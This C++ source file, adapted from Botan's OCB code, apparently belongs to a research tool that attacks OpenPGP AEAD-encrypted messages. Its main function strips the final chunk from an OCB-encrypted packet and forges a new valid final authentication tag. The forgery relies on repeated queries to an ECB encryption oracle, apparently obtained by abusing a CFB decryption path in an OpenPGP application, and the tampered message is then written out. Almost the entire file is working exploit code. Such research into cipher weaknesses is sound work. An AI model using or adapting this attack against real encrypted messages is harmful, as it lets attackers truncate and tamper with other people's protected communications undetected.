#include "ocb-oracle.h"
#include "botan/hex.h"
#include "ocb-detail.h"
#include "cipher_block.h"
#include "ocb-detail.h"
#include "assert_util.h"
#include "opgp_cfb_decr_fun_simulation.h"
#include <set>
#include <vector>

/*
* This code was adopted from the Botan library
* OCB Mode
* (C) 2013,2017 Jack Lloyd
* (C) 2016 Daniel Neus, Rohde & Schwarz Cybersecurity
* (C) 2024 Falko Strenzke
*
* Botan is released under the Simplified BSD License (see license.txt)
*/


namespace
{

template <size_t B, typename T>
inline constexpr uint8_t get_byte(T input)
    requires(B < sizeof(T))
{
    const size_t shift = ((~B) & (sizeof(T) - 1)) << 3;
    return static_cast<uint8_t>((input >> shift) & 0xFF);
}

inline constexpr void store64_be(uint64_t in, uint8_t out[8])
{
    out[0] = get_byte<0>(in);
    out[1] = get_byte<1>(in);
    out[2] = get_byte<2>(in);
    out[3] = get_byte<3>(in);
    out[4] = get_byte<4>(in);
    out[5] = get_byte<5>(in);
    out[6] = get_byte<6>(in);
    out[7] = get_byte<7>(in);
}

} // namespace

std::vector<uint8_t> determine_nonce_for_aead_chunk(aead_packet_t const& aead,
                                                  uint64_t const chunk_idx_non_final,
                                                  bool const is_final_empty_chunk) 
{
    std::vector<uint8_t> result;
    uint32_t iv_len;
    switch (aead.aead_type())
    {
        case aead_type_e::ocb:
            iv_len = 15;
            break;
        case aead_type_e::eax:
            iv_len = 16;
            break;
        default:
            throw Exception("unknown AEAD mode");
    }
    std::vector<uint8_t> iv = aead.iv();
    if (iv.size() != iv_len)
    {
        throw Exception("invalid iv length for AEAD encountered");
    }
    uint64_t chunk_idx = chunk_idx_non_final;
    if (is_final_empty_chunk)
    {
        // the final chunk is not part of the packet
        chunk_idx = aead.aead_chunks().size();
    }
    if (chunk_idx > aead.aead_chunks().size())
    {
        throw Exception("chunk idx out of range in AEAD packet");
    }

    uint64_t index = chunk_idx;
    switch (aead.aead_type())
    {
        // code take from RNP, specification for OCB missing in draft-koch
        case aead_type_e::ocb:
            for (int i = 14; (i >= 0) && index; i--)
            {
                iv[static_cast<uint8_t>(i)] ^= index & 0xff;
                index = index >> 8;
            }
            break;
        case aead_type_e::eax:
            for (int i = 15; (i > 7) && index; i--)
            {
                iv[static_cast<uint8_t>(i)] ^= index & 0xff;
                index = index >> 8;
            }
            break;
    }
    return iv;
}

std::vector<uint8_t> determine_add_data_for_chunk(aead_packet_t const& aead,
                                                  uint64_t const chunk_idx_non_final,
                                                  bool const is_final_empty_chunk)
{
    uint64_t chunk_idx = chunk_idx_non_final;
    if (is_final_empty_chunk)
    {
        // the final chunk is not part of the packet
        chunk_idx = aead.aead_chunks().size();
    }
    else if(chunk_idx_non_final >= aead.aead_chunks().size())
    {
        throw Exception("index for non-final chunk is out of range");
    }
    if (chunk_idx > aead.aead_chunks().size())
    {
        throw Exception("chunk idx out of range in AEAD packet");
    }
    //  new format encoding (bits 7 and 6 set, bits 5-0 carry the packet tag), version number, cipher algorithm octet,
    //  encryption mode octet, chunk size octet, and an eight-octet, big-endian chunk index as additional data
    //
    std::vector<uint8_t> result = {static_cast<uint8_t>(packet::tag_e::aead) | 0x80 | 0x40,
                                   1,
                                   static_cast<uint8_t>(aead.cipher()),
                                   static_cast<uint8_t>(aead.aead_type()),
                                   aead.chunk_size_octet()};

    std::vector<uint8_t> encoded_idx(8);
    store64_be(chunk_idx, &encoded_idx[0]);
    result.insert(result.end(), encoded_idx.begin(), encoded_idx.end());

    if (is_final_empty_chunk)
    {
        uint64_t const total_bytes = aead.plaintext_size();
        std::array<uint8_t, 8> total_encoded;
        store64_be(total_bytes, total_encoded.data());
        result.insert(result.end(), total_encoded.begin(), total_encoded.end());
    }
    return result;
}

const cipher_block_t<AES_BLOCK_SIZE> offset0_from_nonce(uint32_t iter,
                                              run_time_ctrl_t ctl,
                                              // vector_cfb_ciphertext_t const& vec_ct,
                                              vector_ct_t& vec_ct,
                                              std::span<const uint8_t> pkesk,
                                              std::span<const uint8_t> session_key,
                                              openpgp_app_decr_params_t const& decr_params,
                                              std::filesystem::path const& msg_file_path,
                                              const uint8_t nonce[],
                                              size_t nonce_len)
{
    const size_t BS = AES_BLOCK_SIZE;

    size_t tag_size = 16;
    std::vector<uint8_t> nonce_buf, stretch, offset;

    BOTAN_ASSERT(BS == 16 || BS == 24 || BS == 32 || BS == 64, "OCB block size is supported");

    const size_t MASKLEN = (BS == 16 ? 6 : ((BS == 24) ? 7 : 8));

    const uint8_t BOTTOM_MASK = static_cast<uint8_t>((static_cast<uint16_t>(1) << MASKLEN) - 1);

    nonce_buf.resize(BS);
    // clear_mem(&nonce_buf[0], nonce_buf.size());

    memcpy(&nonce_buf[BS - nonce_len], nonce, nonce_len);
    nonce_buf[0] = static_cast<uint8_t>(((tag_size * 8) % (BS * 8)) << (BS <= 16 ? 1 : 0));

    nonce_buf[BS - nonce_len - 1] ^= 1;

    const uint8_t bottom = nonce_buf[BS - 1] & BOTTOM_MASK; // q
    nonce_buf[BS - 1] &= ~BOTTOM_MASK;

    // const bool need_new_stretch = (m_last_nonce != nonce_buf);
    const bool need_new_stretch = true;
    if (need_new_stretch)
    {
        // m_last_nonce = nonce_buf;

        // m_cipher->encrypt(nonce_buf);


        cipher_block_vec_t<AES_BLOCK_SIZE> oracle_ciphertext_blocks;
        oracle_ciphertext_blocks.push_back(nonce_buf);
        cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encr_nonce_block_from_oracle =
            invoke_ecb_opgp_decr(std::format("{}-ocb-remove-chunk-att-nonce-query-pgp-msg", iter),
                                 ctl,
                                 vec_ct,
                                 oracle_ciphertext_blocks,
                                 pkesk,
                                 decr_params,
                                 session_key,
                                 msg_file_path);

        if (ecb_encr_nonce_block_from_oracle.size() != 1)
        {
            throw Exception("invalid size of encrypted nonce blocks returned from oracle");
        }
        nonce_buf = ecb_encr_nonce_block_from_oracle[0].to_uint8_vec();
        /*
        The loop bounds (BS vs BS/2) are derived from the relation
        between the block size and the MASKLEN. Using the terminology
        of draft-krovetz-ocb-wide, we have to derive enough bits in
        ShiftedKtop to read up to BLOCKLEN+bottom bits from Stretch.

                   +----------+---------+-------+---------+
                   | BLOCKLEN | RESIDUE | SHIFT | MASKLEN |
                   +----------+---------+-------+---------+
                   |       32 |     141 |    17 |    4    |
                   |       64 |      27 |    25 |    5    |
                   |       96 |    1601 |    33 |    6    |
                   |      128 |     135 |     8 |    6    |
                   |      192 |     135 |    40 |    7    |
                   |      256 |    1061 |     1 |    8    |
                   |      384 |    4109 |    80 |    8    |
                   |      512 |     293 |   176 |    8    |
                   |     1024 |  524355 |   352 |    9    |
                   +----------+---------+-------+---------+
        */
        if (BS == 16)
        {
            for (size_t i = 0; i != BS / 2; ++i)
            {
                nonce_buf.push_back(nonce_buf[i] ^ nonce_buf[i + 1]);
            }
        }
#if 0
       else if(BS == 24) {
         for(size_t i = 0; i != 16; ++i) {
            nonce_buf.push_back(nonce_buf[i] ^ nonce_buf[i + 5]);
         }
      } else if(BS == 32) {
         for(size_t i = 0; i != BS; ++i) {
            nonce_buf.push_back(nonce_buf[i] ^ (nonce_buf[i] << 1) ^ (nonce_buf[i + 1] >> 7));
         }
      } else if(BS == 64) {
         for(size_t i = 0; i != BS / 2; ++i) {
            nonce_buf.push_back(nonce_buf[i] ^ nonce_buf[i + 22]);
         }
      }
#endif

        stretch = nonce_buf;
    }

    // now set the offset from stretch and bottom
    const size_t shift_bytes = bottom / 8;
    const size_t shift_bits  = bottom % 8;

    BOTAN_ASSERT(stretch.size() >= BS + shift_bytes + 1, "Size ok");

    offset.resize(BS);
    for (size_t i = 0; i != BS; ++i)
    {
        offset[i] = static_cast<uint8_t>((stretch[i + shift_bytes] << shift_bits));
        offset[i] |= (stretch[i + shift_bytes + 1] >> (8 - shift_bits));
    }

    return cipher_block_t<AES_BLOCK_SIZE>(offset);
}

    void ocb_attack_remove_final_chunk(uint32_t iter,
                                       run_time_ctrl_t ctl,
                                       // vector_cfb_ciphertext_t const& vec_ct,
                                       vector_ct_t & vec_ct,
                                       std::span<const uint8_t> pkesk,
                                       std::span<const uint8_t> session_key,
                                       aead_packet_t const& aead_packet,
                                       std::span<const uint8_t> encrypted_zero_block,
                                       openpgp_app_decr_params_t const& decr_params,
                                       std::filesystem::path const& msg_file_path)
    {

    /**
     * removing the final chunk by recalculating the final tag and stripping the chunk before it.
     * add data for final tag computation:
     * as in the normal chunks, plus 8-octet BE total encoded bytes.
     * => strip out the last real chunk
     * => recalculate the final auth tag with
     * original add data = add_data(final_chunk_idx, total_bytes)
     * new add data      = add_data(final_chunk_idx-1, total_bytes-chunk_size)
     *
     * need to compute tag for empty chunk:
     *
     *          blockEncrypt_k (s_0 ⊕ G_0 ⊕ L_$ ) ⊕ HASH(K, A)
     *          s_0 = [0]¹²⁸
     *
     *          Ñ = num2str(taglen mod 128, 7) ‖ [0]^{120−|N|} ‖ 1 ‖ N
     *          q = str2num(Ñ[123:128]) // “bottom”
     *          f = blockEncryptk (Ñ[1:122] ‖ [0]⁶ ) // “Ktop”
     *          l = f ||(f[1:64] ⊕ f [9:72]) // “Stretch”
     *          G_0 = l[1 + q : 128 + q] // “Offset”
     *
     */

    std::cout << "AEAD packet:\n" << aead_packet.to_string() << "\n";
    std::cout << std::format("AEAD packet's final auth tag = {}\n", Botan::hex_encode(aead_packet.final_auth_tag()));
    std::string cipher_spec;
    if (aead_packet.cipher() == cipher_e::aes_128)
    {
        cipher_spec = "AES-128";
    }
    else if (aead_packet.cipher() == cipher_e::aes_256)
    {
        cipher_spec = "AES-256";
    }
    else
    {
        throw Exception(std::format("unsupported cipher type {}", static_cast<uint8_t>(aead_packet.cipher())));
    }
    auto enc = Botan::BlockCipher::create(cipher_spec);
    L_computer l_computer(encrypted_zero_block);

    aead_packet_t mod_aead_packet(aead_packet);
    auto stripped_chunks = aead_packet.aead_chunks();
    stripped_chunks.pop_back();
    stripped_chunks.pop_back();
    mod_aead_packet.set_chunks(stripped_chunks);

    std::vector<uint8_t> add_data_final_mod = determine_add_data_for_chunk(mod_aead_packet, 0, true);

    std::cout << std::format("add_data_final_mod  = {}\n", Botan::hex_encode(add_data_final_mod));



    std::cout << std::format("OCB-IV: {}\n", Botan::hex_encode(aead_packet.iv()));

    // parse the add. data into full blocks and potentially trailing non-full block:
    cipher_block_vec_t<AES_BLOCK_SIZE>::full_blocks_and_trailing_t add_data_blocks_and_trail;

    add_data_blocks_and_trail = cipher_block_vec_t<AES_BLOCK_SIZE>::parse_to_blocks_and_trailing(add_data_final_mod);


    cipher_block_vec_t<AES_BLOCK_SIZE> F;
    F.push_back(cipher_block_t<AES_BLOCK_SIZE>()); // F_0 = [0]^{128}
    std::cout << std::format("#add data full blocks: {}\n", add_data_blocks_and_trail.full_blocks.size());
    for (uint32_t i = 1; i <= add_data_blocks_and_trail.full_blocks.size(); i++)
    {
        cipher_block_t<AES_BLOCK_SIZE> x(l_computer.get(var_ctz32(i))); // L_ntz(i)
        x ^= F[F.size() - 1];                                           // L_ntz(i) ⊕ F_{i-1}
        F.push_back(x);
        std::cout << std::format("OCB hash: full blocks: adding offset = {}\n", x.hex());
    }

    std::cout << std::format("OCB hash: full blocks: offsets = {}\n", F.hex());

    // F_0 is not used for the actual computations
    F.erase(F.begin());

    // padd the non-full trailing blocks of the add. data:
    cipher_block_vec_t<AES_BLOCK_SIZE>::full_blocks_and_trailing_t & ad_data = add_data_blocks_and_trail;
    auto& trailing                                                         = ad_data.trailing;
    std::cout << std::format("trailing = {}\n", trailing.size());
    if (trailing.size() > 0)
    {
        // at least one byte smaller than the block size
        ad_data.trailing.push_back(0x80); // ‖ 1000 0000
        while (trailing.size() < AES_BLOCK_SIZE)
        {
            trailing.push_back(0);
        }
        // set the new full block:
        ad_data.full_blocks.push_back(trailing);
        trailing.resize(0);
        // compute the corresponding offset block:
        cipher_block_t<AES_BLOCK_SIZE> L_star = l_computer.star();
        if (F.size() < ad_data.full_blocks.size()) // should always be true
        {
            cipher_block_t<AES_BLOCK_SIZE> prev_block; // again F_0 = [0]¹²⁸
            if (F.size())
            {
                prev_block = F[F.size() - 1];
            }
            F.push_back(prev_block ^ L_star);
            std::cout << std::format("OCB hash: trailing: offset = {}\n", F[F.size() - 1].hex());
        }
    }

    // verify lengths are matching
    if (add_data_blocks_and_trail.full_blocks.size() != F.size())
    {
        throw Exception(std::format("internal error: size of offsets ({}) and additional data ({}) is not matching",
                                    F.size(),
                                    add_data_blocks_and_trail.full_blocks.size()));
    }

    // query for the encryption of A_1 ⊕ F_1 ‖ … ‖ A_n ⊕ F_n
    cipher_block_vec_t<AES_BLOCK_SIZE> oracle_ciphertext_blocks;
    for (size_t i = 0; i < F.size(); i++)
    {
        oracle_ciphertext_blocks.push_back(F[i] ^ add_data_blocks_and_trail.full_blocks[i]);
    }


    assertm(vec_ct.leading_blocks().size() != 0, "leading blocks of vector ciphertext may not be empty");

    // no need to append another block (zero block) because the final CFB ciphertext block is not subject to block
    std::cout << "OCB chunk strip attack: first oracle query ...\n";
    // decryption, this is done in the called function:
    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encr_blocks_from_oracle =
        invoke_ecb_opgp_decr(std::format("{}-ocb-remove-chunk-att-init-query-pgp-msg", iter),
                             ctl,
                             vec_ct,
                             oracle_ciphertext_blocks,
                             pkesk,
                             decr_params,
                             session_key,
                             msg_file_path);
    std::cout << "... OCB chunk strip attack: first oracle query completed\n";

    // parse g as S_1 || . . . || S_n || S'_1 . . . || S'_n with N
    if (ecb_encr_blocks_from_oracle.size() != oracle_ciphertext_blocks.size())
    {
        throw Exception("invalid size of result returned from 2nd oracle query for OCB block strip attack");
    }
    cipher_block_t<AES_BLOCK_SIZE> S_xor_sum;
    for (cipher_block_t<AES_BLOCK_SIZE> const& block : ecb_encr_blocks_from_oracle)
    {
        S_xor_sum ^= block;
    }
    cipher_block_t<AES_BLOCK_SIZE> new_final_tag = S_xor_sum; // = HASH(K, A)
    
    std::cout << std::format("OCB hash result = {}\n", S_xor_sum.hex());

    //  blockEncrypt_k ( G_0 ⊕ L_$ ) ⊕ HASH(K, A)
    std::vector<uint8_t> nonce = aead_packet.iv();
    // ignore excess nonce octets
    if (nonce.size() > 15)

    {
        nonce.erase(nonce.begin() + 15, nonce.end());
    }
    if (nonce.size() < 15)
    {
        throw Exception("IV too small for OCB");
    }
    // xor the chunk-idx into the IV
    uint8_t new_final_chunk_idx = static_cast<uint8_t>(mod_aead_packet.aead_chunks().size());

    nonce[14] ^= new_final_chunk_idx;
    std::cout << "nonce for tag computation of final empty chunk: " << Botan::hex_encode(nonce) << std::endl;


    cipher_block_t<AES_BLOCK_SIZE> G_0 = offset0_from_nonce(
        iter, ctl, vec_ct, pkesk, session_key, decr_params, msg_file_path, nonce.data(), nonce.size());
    std::cout << std::format("G_0 for encryption: {}\n", G_0.hex());
    cipher_block_t<AES_BLOCK_SIZE> F0_xor_Ldollar(l_computer.dollar());
    F0_xor_Ldollar ^= G_0;

    cipher_block_vec_t<AES_BLOCK_SIZE> ct_F0_Ldollar;
    ct_F0_Ldollar.push_back(F0_xor_Ldollar);

    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encr_F0_xor_Ldollar_block_from_oracle =
        invoke_ecb_opgp_decr(std::format("{}-ocb-remove-chunk-att-F0_xor_Ldollar-query-pgp-msg", iter),
                             ctl,
                             vec_ct,
                             ct_F0_Ldollar,
                             pkesk,
                             decr_params,
                             session_key,
                             msg_file_path);
    if (ecb_encr_F0_xor_Ldollar_block_from_oracle.size() != 1)
    {
        throw Exception(std::format("unexptected block count of {} for oracle decryption result for F0_xor_Ldollar",
                                    ecb_encr_F0_xor_Ldollar_block_from_oracle.size()));
    }
    new_final_tag ^= ecb_encr_F0_xor_Ldollar_block_from_oracle[0];
    std::cout << "new final tag of final empty chunk computed in attack: " << Botan::hex_encode(new_final_tag) << std::endl;

    mod_aead_packet.set_final_auth_tag(new_final_tag.to_uint8_vec());
    auto encoded_mod_aead_packet = mod_aead_packet.get_encoded();
    ctl.potentially_write_run_time_file(encoded_mod_aead_packet,
                                        std::format("{}-aead-packet-with-final-chunk-removed", iter));
    std::vector<uint8_t> mod_msg(pkesk.begin(), pkesk.end());
    mod_msg.insert(mod_msg.end(), encoded_mod_aead_packet.begin(), encoded_mod_aead_packet.end());
    ctl.potentially_write_run_time_file(mod_msg,
                                        std::format("{}-pkesk-then-aead-packet-with-final-chunk-removed", iter));
    }
